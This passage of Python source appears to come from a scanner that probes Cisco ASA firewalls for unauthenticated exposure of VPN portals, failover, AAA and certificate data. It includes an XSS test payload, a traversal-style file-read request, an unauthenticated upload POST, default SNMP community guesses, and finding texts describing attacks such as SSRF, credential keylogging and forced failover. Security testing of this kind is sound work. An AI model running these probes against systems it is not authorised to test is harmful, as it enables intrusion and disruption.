    # ── Probe 7: local user database unauth read ──────────────────────────────
    # ch07: local user database = fallback auth when external servers fail
    sc7, body7, _ = _do_get('/api/aaa/authentication/localusers')
    if sc7 == 200 and len(body7) > 0 and (
        'user' in body7.lower()
        or 'privilege' in body7.lower()
        or 'password' in body7.lower()
    ):
        user_count = len(re.findall(r'"username"\s*:', body7, re.IGNORECASE))
        findings.append({
            'severity': 'CRITICAL',
            'title': 'ASA_LOCAL_USERS_UNAUTH — Local user database readable without authentication',
            'detail': (
                f'GET /api/aaa/authentication/localusers at {host}:{port} returned '
                f'HTTP {sc7} ({len(body7)} bytes) containing user-identifying content.  '
                f'Estimated user entries: {user_count}.  '
                f'ch07: the ASA local user database stores usernames, privilege levels '
                f'(0-15), and password hashes; unauthenticated read exposes credentials '
                f'for offline cracking and reveals which accounts have privilege 15 '
                f'(full admin).  ch07: LOCAL is the fallback when RADIUS/TACACS+ fail — '
                f'obtaining local credentials bypasses the external AAA server entirely.  '
                f'Body excerpt: {body7[:300]}'
            ),
            'host': host,
            'port': port,
        })

    # ── Probe 8: SSL certificate chains (certificate-based auth) ─────────────
    # ch07: certificate-based auth maps cert fields to privilege levels
    sc8, body8, _ = _do_get('/api/ssl/certificates')
    if sc8 == 200 and len(body8) > 0 and (
        'certificate' in body8.lower()
        or 'cert' in body8.lower()
        or 'subject' in body8.lower()
        or 'issuer' in body8.lower()
    ):
        findings.append({
            'severity': 'HIGH',
            'title': 'ASA_SSL_CERTS_UNAUTH — SSL certificate store readable without authentication',
            'detail': (
                f'GET /api/ssl/certificates at {host}:{port} returned HTTP {sc8} '
                f'({len(body8)} bytes) containing certificate-identifying content.  '
                f'ch07: certificate-based authentication on ASA maps X.509 subject '
                f'fields to user identity; reading the certificate store reveals '
                f'subject DNs, issuers, and serial numbers, enabling certificate '
                f'cloning or impersonation attacks.  Identity certificate details '
                f'also disclose internal PKI structure and CA hierarchy.  '
                f'Body excerpt: {body8[:300]}'
            ),
            'host': host,
            'port': port,
        })

    return findings


def probe_asa_clientless_vpn_portal_re(host, port=443, timeout=10.0):
    """Deep reverse-engineering of Cisco ASA clientless SSL VPN portal attack surface.

    Synthesized from: Chapter 22 (Clientless Remote-Access SSL VPNs), Chapter 4
    (WebVPN Setup), Chapter 7 (AAA for SSL VPN) — Cisco ASA All-in-One NGFW
    Firewall, IPS, and VPN Services, 3rd Edition.

    ch22: The ASA clientless SSL VPN portal is served from two URL namespaces:
      /+CSCOE+/  — authenticated portal handler (user-facing post-login pages)
      /+CSCOT+/  — translation/customization engine (pre-auth file-serving)
      /+CSCOU+/  — uploaded web content (images, scripts, customization files)
      /+webvpn+/ — session handler (index, proxy, application launch)

    ch22: bookmarks allow access to internal RDP, VNC, SSH, CIFS, and web servers
    via the ASA proxy; the bookmark endpoints themselves are reachable pre-auth on
    some ASA versions.  The customization system accepts XML/HTML uploads and serves
    them via /+CSCOT+/translation-table.  CVE-2014-2120 (XSS) and CVE-2020-3452
    (path traversal) both target these namespaces.

    Attack surface probed:
      /+CSCOE+/portal.html           — portal presence fingerprint
      /+CSCOE+/rdp.html              — RDP bookmark application page
      /+CSCOE+/vnc.html              — VNC bookmark application page
      /+CSCOE+/ssh.html              — SSH bookmark application page
      /+CSCOE+/win.js?passUrl=       — CVE-2014-2120 XSS parameter
      /+CSCOT+/translation-table     — file read via textdomain traversal
      /+webvpn+/index.html           — WebVPN proxy / post-auth portal
      /admin/config/portal            — portal customization upload surface
      /+CSCOE+/session.html          — pre-auth session enumeration
      /+CSCOT+/oem-customization.tar.gz — OEM config archive download
      /CACHE/stc/1/binaries/hostscan_win.exe — Hostscan client binary exposure

    All HTTPS probes use ssl.CERT_NONE / check_hostname=False.
    """
    findings = []

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    base = f'https://{host}:{port}'

    def _do_get(path, extra_headers=None):
        url = f'{base}{path}'
        hdrs = {
            'Accept': 'text/html,application/xhtml+xml,application/xml,*/*',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        }
        if extra_headers:
            hdrs.update(extra_headers)
        req = urllib.request.Request(url, headers=hdrs)
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                body = r.read(8192).decode('utf-8', errors='replace')
                return r.status, body, dict(r.headers)
        except urllib.error.HTTPError as e:
            body = ''
            try:
                body = e.read(4096).decode('utf-8', errors='replace')
            except Exception:
                pass
            return e.code, body, dict(e.headers)
        except Exception:
            return None, '', {}

    def _do_post(path, post_body_bytes, extra_headers=None):
        url = f'{base}{path}'
        hdrs = {
            'Accept': 'text/html,*/*',
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/octet-stream',
        }
        if extra_headers:
            hdrs.update(extra_headers)
        req = urllib.request.Request(url, data=post_body_bytes, headers=hdrs, method='POST')
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                body = r.read(4096).decode('utf-8', errors='replace')
                return r.status, body, dict(r.headers)
        except urllib.error.HTTPError as e:
            body = ''
            try:
                body = e.read(2048).decode('utf-8', errors='replace')
            except Exception:
                pass
            return e.code, body, dict(e.headers)
        except Exception:
            return None, '', {}

    # ── Probe 1: portal fingerprint ───────────────────────────────────────────
    # ch22: /+CSCOE+/portal.html is the authenticated landing page post-login
    sc1, body1, _ = _do_get('/+CSCOE+/portal.html')
    portal_confirmed = False
    if sc1 in (200, 302) and (
        'cisco' in body1.lower()
        or 'csco_cvpn' in body1.lower()
        or 'webvpn' in body1.lower()
        or '+CSCOE+' in body1
        or 'portal' in body1.lower()
    ):
        portal_confirmed = True
        findings.append({
            'severity': 'MEDIUM',
            'title': 'ASA_CLIENTLESS_PORTAL — Cisco ASA clientless SSL VPN portal detected at /+CSCOE+/portal.html',
            'detail': (
                f'GET /+CSCOE+/portal.html at {host}:{port} returned HTTP {sc1} '
                f'with Cisco WebVPN-identifying content.  '
                f'ch22: the /+CSCOE+/ namespace is the clientless SSL VPN portal '
                f'handler; portal.html is the main authenticated user interface.  '
                f'Portal presence confirms clientless SSL VPN is enabled on this '
                f'interface and activates the full /+CSCOE+/ / /+CSCOT+/ attack '
                f'surface (CVE-2014-2120 XSS, CVE-2020-3452 path traversal, '
                f'bookmark SSRF, session enumeration).  '
                f'Body excerpt: {body1[:300]}'
            ),
            'host': host,
            'port': port,
        })

    # ── Probe 2: bookmark/application pages (SSRF surface) ───────────────────
    # ch22: RDP/VNC/SSH bookmark pages proxy connections to internal hosts
    app_pages = [
        ('/+CSCOE+/rdp.html', 'RDP', 'Remote Desktop Protocol'),
        ('/+CSCOE+/vnc.html', 'VNC', 'Virtual Network Computing'),
        ('/+CSCOE+/ssh.html', 'SSH', 'Secure Shell'),
    ]
    accessible_apps = []
    for app_path, app_short, app_full in app_pages:
        sc_a, body_a, _ = _do_get(app_path)
        if sc_a == 200 and len(body_a) > 50 and (
            app_short.lower() in body_a.lower()
            or 'cisco' in body_a.lower()
            or 'csco' in body_a.lower()
            or 'webvpn' in body_a.lower()
        ):
            accessible_apps.append((app_path, app_short, app_full, sc_a))

    if accessible_apps:
        app_list = ', '.join(f'{s} ({p})' for p, s, _, _ in accessible_apps)
        findings.append({
            'severity': 'HIGH',
            'title': f'ASA_PORTAL_APP_PAGES — Clientless VPN application proxy pages accessible: {app_list}',
            'detail': (
                f'Application proxy pages at {host}:{port} returned HTTP 200 with '
                f'application-identifying content: {app_list}.  '
                f'ch22: the clientless VPN portal proxies RDP, VNC, and SSH sessions '
                f'through the ASA to internal hosts via the bookmark mechanism; '
                f'pre-auth access to these pages indicates the proxy handler is '
                f'reachable without a valid session.  '
                f'SSRF vector: supplying an internal host/IP to the proxy handler '
                f'causes the ASA to initiate connections into the protected network '
                f'on behalf of the unauthenticated attacker — internal host '
                f'enumeration and service identification without direct connectivity.  '
                f'Accessible: {app_list}'
            ),
            'host': host,
            'port': port,
        })

    # ── Probe 3: CVE-2014-2120 XSS in portal win.js ──────────────────────────
    # ch22: win.js is a WebVPN helper script; passUrl param is reflected unescaped
    xss_path = '/+CSCOE+/win.js?passUrl=javascript%3Aalert%281%29'
    sc3, body3, _ = _do_get(xss_path)
    if sc3 == 200 and (
        'javascript:alert' in body3
        or 'passurl' in body3.lower()
        or 'javascript' in body3.lower()
    ) and 'blocked' not in body3.lower():
        findings.append({
            'severity': 'CRITICAL',
            'title': 'ASA_CVE_2014_2120 — Reflected XSS in clientless VPN portal (CVE-2014-2120)',
            'detail': (
                f'GET /+CSCOE+/win.js?passUrl=javascript:alert(1) at '
                f'{host}:{port} returned HTTP {sc3} with the passUrl parameter '
                f'reflected in the response body.  '
                f'CVE-2014-2120 (CVSS 4.3): the passUrl parameter in the ASA '
                f'WebVPN win.js handler is not sanitized before reflection, '
                f'enabling reflected XSS attacks against authenticated VPN users.  '
                f'ch22: clientless VPN sessions operate within the browser under '
                f'the ASA\'s domain; XSS allows session cookie theft, credential '
                f'harvesting from the VPN logon form, and redirection to attacker '
                f'infrastructure.  Affects ASA 9.x before 9.1(5.21) / 9.2(1).  '
                f'Body excerpt: {body3[:400]}'
            ),
            'host': host,
            'port': port,
        })

    # ── Probe 4: file read via translation-table textdomain ───────────────────
    # ch22: translation-table serves customization files; textdomain is traversable
    # This path attempts to read /+CSCOE+/logon.html through the translation engine
    file_read_path = (
        '/+CSCOT+/translation-table'
        '?type=mst'
        '&textdomain=%2bCSCOE%2b%2flogon.html'
    )
    sc4, body4, _ = _do_get(file_read_path)
    if sc4 == 200 and len(body4) > 100 and (
        'logon' in body4.lower()
        or 'cisco' in body4.lower()
        or 'webvpn' in body4.lower()
        or 'username' in body4.lower()
        or 'password' in body4.lower()
    ):
        findings.append({
            'severity': 'CRITICAL',
            'title': 'ASA_PORTAL_FILE_READ — Clientless VPN translation-table endpoint serves arbitrary portal files',
            'detail': (
                f'GET /+CSCOT+/translation-table?type=mst&textdomain=%2bCSCOE%2b%2f'
                f'logon.html at {host}:{port} returned HTTP {sc4} ({len(body4)} bytes) '
                f'containing portal HTML content.  '
                f'ch22: the /+CSCOT+/translation-table endpoint serves localization '
                f'files for portal customization; the textdomain parameter specifies '
                f'the file to serve from the WebVPN flash namespace.  '
                f'Insufficient sanitization allows reading arbitrary files accessible '
                f'to the WebVPN handler (related to CVE-2020-3452 class: path '
                f'traversal in the ASA WebVPN subsystem).  '
                f'Readable files include portal templates, customization XML, '
                f'potentially cached configuration fragments.  '
                f'Body excerpt: {body4[:400]}'
            ),
            'host': host,
            'port': port,
        })

    # ── Probe 5: WebVPN proxy index (post-auth portal handler) ───────────────
    # ch22: /+webvpn+/index.html is the main post-auth WebVPN session page
    sc5, body5, _ = _do_get('/+webvpn+/index.html')
    if sc5 == 200 and len(body5) > 50 and (
        'webvpn' in body5.lower()
        or 'cisco' in body5.lower()
        or 'csco' in body5.lower()
        or 'portal' in body5.lower()
    ):
        findings.append({
            'severity': 'HIGH',
            'title': 'ASA_WEBVPN_PROXY — WebVPN application proxy handler accessible at /+webvpn+/index.html',
            'detail': (
                f'GET /+webvpn+/index.html at {host}:{port} returned HTTP {sc5} '
                f'({len(body5)} bytes) with WebVPN-identifying content.  '
                f'ch22: the /+webvpn+/ namespace is the ASA session handler for '
                f'clientless VPN application proxy; access without a valid session '
                f'cookie indicates session state is not properly enforced.  '
                f'The proxy handler routes HTTP/HTTPS, CIFS, RDP, VNC, and SSH '
                f'traffic to internal hosts — unauthenticated access grants SSRF '
                f'capability into the protected network.  '
                f'Body excerpt: {body5[:300]}'
            ),
            'host': host,
            'port': port,
        })

    # ── Probe 6: portal customization upload surface ──────────────────────────
    # ch22: ASDM uploads customization via /admin/config/portal (XML/HTML)
    sc6, body6, hdrs6 = _do_post(
        '/admin/config/portal',
        b'<customization><title>test</title></customization>',
        extra_headers={'Content-Type': 'application/xml'},
    )
    if sc6 in (200, 201, 400, 405, 415) and (
        'portal' in body6.lower()
        or 'custom' in body6.lower()
        or 'xml' in body6.lower()
        or sc6 in (200, 201)
    ):
        sev = 'CRITICAL' if sc6 in (200, 201) else 'HIGH'
        findings.append({
            'severity': sev,
            'title': f'ASA_PORTAL_UPLOAD_SURFACE — Portal customization upload endpoint reachable (HTTP {sc6})',
            'detail': (
                f'POST /admin/config/portal at {host}:{port} returned HTTP {sc6}.  '
                f'ch22: ASA clientless SSL VPN allows portal customization via XML '
                f'uploaded through ASDM; the customization engine stores content in '
                f'flash and serves it via /+CSCOT+/ and /+CSCOU+/.  '
                f'A reachable upload endpoint (even returning 400/405) confirms '
                f'the handler exists; a 200/201 indicates write access without '
                f'authentication, enabling persistent XSS injection into the '
                f'portal template served to all clientless VPN users.  '
                f'ch22: custom JavaScript is supported via portal customization '
                f'(custom.js include), enabling persistent keylogging of VPN creds.  '
                f'Body excerpt: {body6[:200]}'
            ),
            'host': host,
            'port': port,
        })

    # ── Probe 7: pre-auth session enumeration ─────────────────────────────────
    # ch22: session.html may expose active session metadata pre-auth
    sc7, body7, _ = _do_get('/+CSCOE+/session.html')
    if sc7 == 200 and len(body7) > 50 and (
        'session' in body7.lower()
        or 'cisco' in body7.lower()
        or 'csco' in body7.lower()
        or 'user' in body7.lower()
    ):
        findings.append({
            'severity': 'HIGH',
            'title': 'ASA_SESSION_INFO — SSL VPN session information accessible pre-authentication',
            'detail': (
                f'GET /+CSCOE+/session.html at {host}:{port} returned HTTP {sc7} '
                f'({len(body7)} bytes) with session-identifying content.  '
                f'ch22: session.html is part of the clientless VPN portal session '
                f'lifecycle; pre-auth access may expose active session counts, '
                f'usernames, or session tokens, enabling session fixation or '
                f'targeted session hijacking.  '
                f'Session metadata discloses concurrent user count (capacity planning '
                f'intel for DoS timing) and potentially active usernames for '
                f'credential stuffing.  '
                f'Body excerpt: {body7[:300]}'
            ),
            'host': host,
            'port': port,
        })

    # ── Probe 8: OEM customization archive download ───────────────────────────
    # ch22: ASA stores OEM customization in tar.gz on flash; served via /+CSCOT+/
    sc8, body8, hdrs8 = _do_get('/+CSCOT+/oem-customization.tar.gz')
    ct8 = hdrs8.get('Content-Type', hdrs8.get('content-type', ''))
    if sc8 == 200 and (
        'gzip' in ct8.lower()
        or 'tar' in ct8.lower()
        or 'application/octet' in ct8.lower()
        or (len(body8) > 20 and body8[:2] == '\x1f\x8b')
    ):
        findings.append({
            'severity': 'CRITICAL',
            'title': 'ASA_PORTAL_CONFIG_DOWNLOAD — OEM portal customization archive downloadable without authentication',
            'detail': (
                f'GET /+CSCOT+/oem-customization.tar.gz at {host}:{port} returned '
                f'HTTP {sc8} with Content-Type: {ct8!r}.  '
                f'ch22: OEM customization archives contain portal HTML templates, '
                f'JavaScript, CSS, images, and potentially XML policy files '
                f'stored on the ASA flash.  Unauthenticated download exposes '
                f'the complete portal customization (including any hardcoded '
                f'internal URLs, embedded credentials in JavaScript, or '
                f'configuration parameters placed in portal templates).  '
                f'Archive contents map internal network topology disclosed via '
                f'bookmark URLs embedded in the customization XML.'
            ),
            'host': host,
            'port': port,
        })

    # ── Probe 9: Cisco Hostscan binary exposure ───────────────────────────────
    # ch22: Hostscan is the endpoint compliance scanner downloaded during VPN setup
    sc9, body9, hdrs9 = _do_get('/CACHE/stc/1/binaries/hostscan_win.exe')
    ct9 = hdrs9.get('Content-Type', hdrs9.get('content-type', ''))
    cl9 = int(hdrs9.get('Content-Length', hdrs9.get('content-length', 0)) or 0)
    if sc9 == 200 and (
        'octet' in ct9.lower()
        or 'exe' in ct9.lower()
        or cl9 > 10000
        or (len(body9) >= 2 and body9[:2] == 'MZ')
    ):
        findings.append({
            'severity': 'MEDIUM',
            'title': 'ASA_HOSTSCAN_EXPOSED — Cisco Hostscan Windows binary downloadable without authentication',
            'detail': (
                f'GET /CACHE/stc/1/binaries/hostscan_win.exe at {host}:{port} '
                f'returned HTTP {sc9} (Content-Length: {cl9}, Content-Type: {ct9!r}).  '
                f'ch22: Cisco Hostscan is the endpoint compliance agent downloaded '
                f'to VPN clients to enforce CSD (Cisco Secure Desktop) posture '
                f'assessment before granting clientless VPN access.  '
                f'Unauthenticated download discloses the exact Hostscan version, '
                f'enabling version-specific vulnerability research against the '
                f'client-side agent.  Binary analysis may reveal internal API '
                f'endpoints, certificate pins, or hardcoded assessment logic '
                f'that can be bypassed to spoof compliant posture.  '
                f'Binary PE magic confirmed: {body9[:2]!r}.'
            ),
            'host': host,
            'port': port,
        })

    return findings


def probe_asa_failover_state_exposure(host, port=443, timeout=10.0):
    """Detect Cisco ASA failover and active/standby HA configuration exposure.

    Synthesized from: Chapter 11 (Failover and Redundancy), 1st Edition.

    ch11 (Architectural Overview): failover control link sends unit state,
    network link status, hello messages, MAC address exchange, and config
    synchronization between Active and Standby units.  Unauthenticated reads
    of /api/failover or /api/cluster/info disclose the complete HA topology
    needed for split-brain attacks, selective unit isolation, and failover
    trigger sequencing.

    ch11 (Stateful Failover, Table 11-1): stateful link replicates TCP/UDP
    connections, xlate, and IKE/IPSec SAs to the Standby unit.  Disrupting
    the stateful link degrades failover to stateless mode, dropping all
    established sessions on switchover.

    ch11 (Conditions that Trigger Failover): two missed consecutive keepalive
    polling periods trigger failover — heartbeat link disruption (TCP/1025)
    forces uncontrolled switchover.

    Endpoints and ports probed:
      HTTPS GET /api/failover     -- active/standby state (role, peer IP, stateful link)
      HTTPS GET /api/cluster/info -- clustering topology and member IPs
      HTTPS GET /api/interfaces   -- interface list with failover interface name
      SNMP UDP/161 OID 1.3.6.1.4.1.9.9.147.1.2.1.1.1.3 (cfwHardwareInformation)
      SNMP UDP/161 OID 1.3.6.1.4.1.9.9.147.1.2.1.1.1.4 (cfwHardwareStatusDescription)
      TCP/1025                    -- failover LAN heartbeat port
      UDP/1026                    -- stateful failover replication port
    """
    findings = []

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    base = f'https://{host}:{port}'

    def _do_get(path):
        url = f'{base}{path}'
        req = urllib.request.Request(
            url,
            headers={'Accept': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        )
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                body = r.read().decode('utf-8', errors='replace')
                return r.status, body
        except urllib.error.HTTPError as e:
            body = ''
            try:
                body = e.read().decode('utf-8', errors='replace')
            except Exception:
                pass
            return e.code, body
        except Exception:
            return None, ''

    # -- Probe 1: /api/failover -------------------------------------------------
    # ch11: API discloses Active/Standby role, failover reason, and timestamp.
    # Active unit owns all primary IPs and MACs; Standby is the disruption target.
    sc1, body1 = _do_get('/api/failover')
    if sc1 == 200 and len(body1) > 10:
        findings.append({
            'severity': 'CRITICAL',
            'title': 'ASA_FAILOVER_STATE_UNAUTH',
            'detail': (
                f'ASA REST API /api/failover at {host}:{port} returned HTTP {sc1} '
                f'({len(body1)} bytes) without authentication.  '
                f'ch11 (Architectural Overview): endpoint discloses unit state '
                f'(Active/Standby), failover reason, and last-failover timestamp -- '
                f'primary topology signal for HA pair disruption sequencing.  '
                f'Excerpt: {body1[:300]}'
            ),
            'host': host,
            'port': port,
        })
        body1_lower = body1.lower()
        if 'active' in body1_lower or 'standby' in body1_lower:
            role = 'Active' if 'active' in body1_lower else 'Standby'
            findings.append({
                'severity': 'HIGH',
                'title': 'ASA_FAILOVER_ROLE_DISCLOSED',
                'detail': (
                    f'Failover role "{role}" confirmed from /api/failover at '
                    f'{host}:{port}.  ch11 (Active/Standby Failover): Active unit '
                    f'holds all primary IPs and MACs; Standby silently eliminates '
                    f'redundancy when disabled.  Excerpt: {body1[:200]}'
                ),
                'host': host,
                'port': port,
            })
        peer_match = re.search(
            r'"(?:peerIp|peer_ip|peerAddress|failoverIp|standbyIp)"'
            r'\s*:\s*"([\d]{1,3}\.[\d]{1,3}\.[\d]{1,3}\.[\d]{1,3})"',
            body1, re.IGNORECASE,
        )
        if peer_match:
            peer_ip = peer_match.group(1)
            findings.append({
                'severity': 'CRITICAL',
                'title': 'ASA_FAILOVER_PEER_IP',
                'detail': (
                    f'Failover peer IP {peer_ip!r} disclosed by /api/failover at '
                    f'{host}:{port}.  ch11 (Step 2 -- Assign Failover IP Addresses): '
                    f'peer is the Standby unit on the dedicated failover LAN interface '
                    f'-- direct access enables forced failover via control-link disruption.'
                ),
                'host': host,
                'port': port,
            })
        if re.search(r'stateful|stateLink|state_link', body1, re.IGNORECASE):
            findings.append({
                'severity': 'HIGH',
                'title': 'ASA_STATEFUL_FAILOVER_LINK',
                'detail': (
                    f'Stateful failover link identity disclosed by /api/failover at '
                    f'{host}:{port}.  ch11 (Stateful Failover, Table 11-1): the '
                    f'stateful link replicates TCP/UDP/xlate/IKE/IPSec SAs to Standby '
                    f'-- disrupting it degrades to stateless mode, dropping all '
                    f'established sessions on switchover.  Excerpt: {body1[:200]}'
                ),
                'host': host,
                'port': port,
            })

    # -- Probe 2: /api/cluster/info ---------------------------------------------
    # ch11 (Active/Active Failover): both units pass traffic in multimode;
    # member IP roster enables per-unit attack sequencing to progressively
    # degrade cluster capacity without triggering bulk failover.
    sc2, body2 = _do_get('/api/cluster/info')
    if sc2 == 200 and len(body2) > 10:
        findings.append({
            'severity': 'CRITICAL',
            'title': 'ASA_CLUSTER_INFO_UNAUTH',
            'detail': (
                f'ASA REST API /api/cluster/info at {host}:{port} returned HTTP {sc2} '
                f'({len(body2)} bytes) without authentication.  '
                f'ch11 (Active/Active Failover): cluster info discloses topology '
                f'for per-unit disruption sequencing to degrade capacity '
                f'without triggering bulk failover.  Excerpt: {body2[:300]}'
            ),
            'host': host,
            'port': port,
        })
        member_ips = re.findall(
            r'"(?:ip|address|memberIp|unitIp)"'
            r'\s*:\s*"([\d]{1,3}\.[\d]{1,3}\.[\d]{1,3}\.[\d]{1,3})"',
            body2, re.IGNORECASE,
        )
        if member_ips:
            findings.append({
                'severity': 'CRITICAL',
                'title': 'ASA_CLUSTER_MEMBERS_DISCLOSED',
                'detail': (
                    f'{len(member_ips)} cluster member IP(s) extracted from '
                    f'/api/cluster/info at {host}:{port}: {member_ips[:10]}.  '
                    f'ch11: Active/Active failover is limited to two failover '
                    f'redundancy groups -- member IPs enable cross-unit recon '
                    f'and targeted per-node attack sequencing.'
                ),
                'host': host,
                'port': port,
            })

    # -- Probe 3: /api/interfaces -----------------------------------------------
    # ch11 (Step 1 -- Select Failover Link): failover LAN interface named
    # "failover" or "lan" carries all control messages; identifying it enables
    # link-layer disruption to trigger uncontrolled failover.
    sc3, body3 = _do_get('/api/interfaces')
    if sc3 == 200 and len(body3) > 10:
        findings.append({
            'severity': 'CRITICAL',
            'title': 'ASA_INTERFACES_UNAUTH',
            'detail': (
                f'ASA REST API /api/interfaces at {host}:{port} returned HTTP {sc3} '
                f'({len(body3)} bytes) without authentication.  '
                f'Interface list with IP addresses exposed -- maps inside/outside/'
                f'dmz/failover segments.  Excerpt: {body3[:300]}'
            ),
            'host': host,
            'port': port,
        })
        if re.search(r'"(?:failover|fo_link|fo-link|folink|lan)"', body3, re.IGNORECASE):
            findings.append({
                'severity': 'HIGH',
                'title': 'ASA_FAILOVER_INTF_IDENTIFIED',
                'detail': (
                    f'Failover interface identified in /api/interfaces at {host}:{port}.  '
                    f'ch11 (Step 1): dedicated failover LAN interface carries unit state, '
                    f'hello keepalives, MAC address exchange, and config synchronization '
                    f'-- disrupting it triggers uncontrolled failover.  '
                    f'Excerpt: {body3[:200]}'
                ),
                'host': host,
                'port': port,
            })

    # -- Probe 4: SNMP failover OIDs via UDP/161 --------------------------------
    # ch11 (Table 11-1): SNMP firewall MIB is NOT replicated in stateful failover;
    # direct SNMP reads expose hardware model and failover operational status.
    # OID 1.3.6.1.4.1.9.9.147 = CISCO-FIREWALL-MIB; 147 BER-encoded = 0x81 0x13.
    def _build_snmp_get(community, oid_bytes):
        # Encode OID TLV
        oid_tlv = b'\x06' + bytes([len(oid_bytes)]) + oid_bytes
        # VarBind: Sequence{ OID, Null }
        null = b'\x05\x00'
        varbind = b'\x30' + bytes([len(oid_tlv) + len(null)]) + oid_tlv + null
        # VarBindList
        vbl = b'\x30' + bytes([len(varbind)]) + varbind
        # GetRequest PDU
        pdu_inner = (
            b'\x02\x04\x00\x00\x00\x01'  # request-id = 1
            + b'\x02\x01\x00'            # error-status = 0
            + b'\x02\x01\x00'            # error-index = 0
            + vbl
        )
        pdu = b'\xa0' + bytes([len(pdu_inner)]) + pdu_inner
        # Community string
        comm = community.encode('ascii')
        comm_tlv = b'\x04' + bytes([len(comm)]) + comm
        # SNMPv1 message
        msg = b'\x02\x01\x00' + comm_tlv + pdu   # version=0 (v1)
        return b'\x30' + bytes([len(msg)]) + msg

    # OID 1.3.6.1.4.1.9.9.147.1.2.1.1.1.3 (cfwHardwareInformation)
    oid_hw = b'\x2b\x06\x01\x04\x01\x09\x09\x81\x13\x01\x02\x01\x01\x01\x03'
    # OID 1.3.6.1.4.1.9.9.147.1.2.1.1.1.4 (cfwHardwareStatusDescription)
    oid_st = b'\x2b\x06\x01\x04\x01\x09\x09\x81\x13\x01\x02\x01\x01\x01\x04'

    for community in ('public', 'cisco', 'failover'):
        for oid_bytes, label, sev, title in (
            (oid_hw, 'cfwHardwareInformation', 'HIGH', 'ASA_HARDWARE_VIA_SNMP'),
            (oid_st, 'cfwHardwareStatusDescription', 'CRITICAL', 'ASA_FAILOVER_STATUS_SNMP'),
        ):
            pkt = _build_snmp_get(community, oid_bytes)
            try:
                snmp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                snmp_sock.settimeout(min(2.0, timeout / 4))
                snmp_sock.sendto(pkt, (host, 161))
                data_snmp, _ = snmp_sock.recvfrom(4096)
                snmp_sock.close()
                # Validate: BER Sequence response
                if data_snmp and len(data_snmp) > 10 and data_snmp[0] == 0x30:
                    findings.append({
                        'severity': sev,
                        'title': title,
                        'detail': (
                            f'SNMP community "{community}" responded to {label} OID '
                            f'query at {host}:161 ({len(data_snmp)} bytes).  '
                            f'ch11 (Table 11-1): SNMP firewall MIB is NOT replicated '
                            f'in stateful failover -- direct reads expose hardware '
                            f'model and failover operational status.  '
                            f'Response hex: {data_snmp[:40].hex()}'
                        ),
                        'host': host,
                        'port': 161,
                    })
            except Exception:
                pass

    # -- Probe 5: TCP/1025 failover LAN heartbeat -------------------------------
    # ch11 (Conditions that Trigger Failover): Standby triggers failover after
    # two missed consecutive keepalive periods on the control interface.
    # Reachable TCP/1025 confirms the control link is network-exposed.
    try:
        s5 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s5.settimeout(min(3.0, timeout / 3))
        s5.connect((host, 1025))
        s5.close()
        findings.append({
            'severity': 'HIGH',
            'title': 'ASA_FAILOVER_LAN_PORT_OPEN',
            'detail': (
                f'TCP/1025 (Cisco ASA failover LAN heartbeat) open on {host}.  '
                f'ch11 (Failover Interface Tests): control link carries unit state, '
                f'hello keepalives, MAC exchange, and config sync between Active and '
                f'Standby -- heartbeat disruption triggers uncontrolled failover after '
                f'two missed polling periods.'
            ),
            'host': host,
            'port': 1025,
        })
    except Exception:
        pass

    # -- Probe 6: UDP/1026 stateful failover ------------------------------------
    # ch11 (Stateful Failover): UDP port carries state table replication
    # (TCP/UDP connections, xlate, IKE/IPSec SAs) from Active to Standby.
    try:
        s6 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s6.settimeout(min(2.0, timeout / 4))
        s6.sendto(b'\x00' * 4, (host, 1026))
        data6, _ = s6.recvfrom(16)
        s6.close()
        if data6:
            findings.append({
                'severity': 'HIGH',
                'title': 'ASA_STATEFUL_FAILOVER_PORT',
                'detail': (
                    f'UDP/1026 (Cisco ASA stateful failover) responded on {host} '
                    f'({len(data6)} bytes).  ch11 (Stateful Failover, Table 11-1): '
                    f'state replication link carries TCP/UDP/xlate/IKE/IPSec SAs '
                    f'from Active to Standby -- disrupting it degrades failover to '
                    f'stateless mode, dropping all established sessions on switchover.'
                ),
                'host': host,
                'port': 1026,
            })
    except Exception:
        pass

    return findings


def probe_asa_aaa_tacacs_exposure(host, port=443, timeout=10.0):
    """Detect Cisco ASA AAA, TACACS+, and RADIUS configuration exposure.

    Synthesized from: Chapter 7 (Authentication, Authorization, and Accounting),
    1st Edition.

    ch7 (AAA Protocols): ASA supports RADIUS (RFC 2865), TACACS+ (TCP/49),
    SDI, Kerberos, and LDAP.  RADIUS and TACACS+ support authentication,
    authorization, and accounting for VPN users, administrative sessions, and
    firewall cut-through proxy.

    ch7 (Defining an Authentication Server): "key cisco123" in aaa-server host
    config is the pre-shared key used to authenticate the NAS (ASA) to the AAA
    server.  If disclosed via REST API, it enables TACACS+/RADIUS server
    impersonation to accept any auth request.

    ch7 (RADIUS): RADIUS passwords are XOR-encrypted with MD5(shared_secret +
    auth_vector); disclosed shared secret enables offline password decryption
    from captured Access-Request packets.

    ch7 (TACACS+): uses TCP port 49; Cisco ASA uses the TCP encoding exclusively;
    supports separate auth/authz/accounting phases unlike RADIUS.

    Endpoints and ports probed:
      HTTPS GET /api/aaa          -- AAA server group list
      HTTPS GET /api/aaa/tacacs   -- TACACS+ server groups and pre-shared keys
      HTTPS GET /api/aaa/radius   -- RADIUS shared secrets
      HTTPS GET /+CSCOE+/logon.html -- auth type disclosure
      TCP/49   TACACS+ authentication start probe
      UDP/1812 RADIUS Access-Request probe
    """
    findings = []

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    base = f'https://{host}:{port}'

    def _do_get(path):
        url = f'{base}{path}'
        req = urllib.request.Request(
            url,
            headers={'Accept': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        )
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                body = r.read().decode('utf-8', errors='replace')
                return r.status, body
        except urllib.error.HTTPError as e:
            body = ''
            try:
